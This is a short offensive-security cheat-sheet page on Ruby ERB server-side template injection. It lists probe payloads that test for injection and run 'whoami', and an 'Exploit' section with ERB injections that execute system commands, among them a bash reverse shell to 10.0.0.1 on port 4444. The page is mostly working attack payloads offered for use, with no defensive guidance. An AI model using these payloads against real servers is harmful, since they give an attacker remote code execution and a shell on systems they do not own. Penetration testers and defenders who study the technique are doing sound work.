---
title: ERB SSTI
description: ERB may be vulnerable to SSTI.
tags:
    - Web
refs:
    - https://trustedsec.com/blog/rubyerb-template-injection
date: 2024-04-13
draft: false
---

## Payloads

Try the following payloads on URL path, params, input, etc.

```bash
<%= 7*7 %>
<%= user.username %>
<%= system("whoami"); %>
```

<br />

## Exploit

If the above payloads affect responses, we can inject arbitrary code as below:

```bash
<%= system("ping -c 1 10.0.0.1"); %>

# Reverse Shell
<%= system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"); %>
```